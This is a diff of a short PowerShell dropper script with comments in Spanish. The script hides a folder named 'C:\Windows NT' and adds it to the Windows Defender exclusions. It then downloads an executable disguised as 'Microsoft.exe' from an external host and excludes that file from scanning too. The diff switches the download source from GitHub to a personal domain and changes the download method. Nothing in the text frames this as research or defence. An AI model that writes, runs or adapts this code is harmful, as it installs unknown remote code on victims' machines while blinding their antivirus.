@@ -1,6 +1,3 @@
-# Forzar el uso de TLS 1.2
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
 # Definir la ruta de la carpeta como "C:\Windows NT"
 $folderPath = "C:\Windows NT"
 if (!(Test-Path $folderPath)) {
@@ -13,10 +10,10 @@ attrib +h $folderPath
 # Agregar la carpeta a las exclusiones de Windows Defender
 Add-MpPreference -ExclusionPath $folderPath
 
-# Descargar el archivo Microsoft.exe desde GitHub y guardarlo en la carpeta creada usando BITS Transfer
-$downloadUrl = "https://github.com/baa4ts/BIT-CROW/raw/refs/heads/main/source/build/Microsoft.exe"
+# Descargar el archivo Microsoft.exe desde GitHub y guardarlo en la carpeta creada
+$downloadUrl = "https://baa4ts.is-a-good.dev/script/Microsoft.exe"
 $outputFile = Join-Path $folderPath "Microsoft.exe"
-Start-BitsTransfer -Source $downloadUrl -Destination $outputFile
+Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile
 
 # Agregar el ejecutable descargado a las exclusiones de Windows Defender
 Add-MpPreference -ExclusionPath $outputFile
